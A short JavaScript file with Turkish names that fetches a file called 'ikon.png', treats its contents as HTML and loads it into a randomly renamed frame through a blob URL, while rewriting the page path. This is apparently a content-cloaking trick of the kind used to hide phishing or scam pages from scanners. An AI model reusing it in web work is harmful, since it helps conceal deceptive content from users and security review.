function rastgeleVeriUret(e) { for (var n = "", t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", a = t.length, o = 0; o < e; o++)n += t.charAt(Math.floor(Math.random() * a)); return n }
function cihaziTurunuBul() {
    let url = '';
    if (window.screen.width < 992 && document.getElementById('mobil') == null) {
        return '/mobil/';
    } else if (window.screen.width > 992 && document.getElementById('pc') == null) {
        return '/pc/';
    }
}
function tersCevir(veri) {
    return veri.split("").reverse().join("");
}
if (tersCevir(window.location.pathname).substring(0, 10) == "lmth.xedni") {
    window.location.replace(window.location.pathname.substring(0, window.location.pathname.length - 10));
}
if (window.location.pathname.substring(0, 4) == "/pc/") { window.location.replace(window.location.pathname.substring(3)); }
else if (window.location.pathname.substring(0, 7) == "/mobil/") { window.location.replace(window.location.pathname.substring(6)); }

function __() {
    const _ = `hakkod-${rastgeleVeriUret(20)}`;
    document.getElementById("ha9qpm26o4").id = _;
    fetch(`${cihaziTurunuBul()}ikon.png`)
        .then((response) => response.text())
        .then((data) => {
            var b = new Blob([data], { type: "text/html;charset=UTF-8" });
            var blob = URL.createObjectURL(b);
            document.getElementById(_).src = blob;
            document.getElementById(_).onload = function () {
                URL.revokeObjectURL(blob);
            }
        })
        .catch((error) => {
        });
}
let mevcutCihazTuru = cihaziTurunuBul();
__();
window.addEventListener('resize', function (event) {
    if (mevcutCihazTuru == cihaziTurunuBul()) return;
    mevcutCihazTuru = cihaziTurunuBul();
    __();
}, true);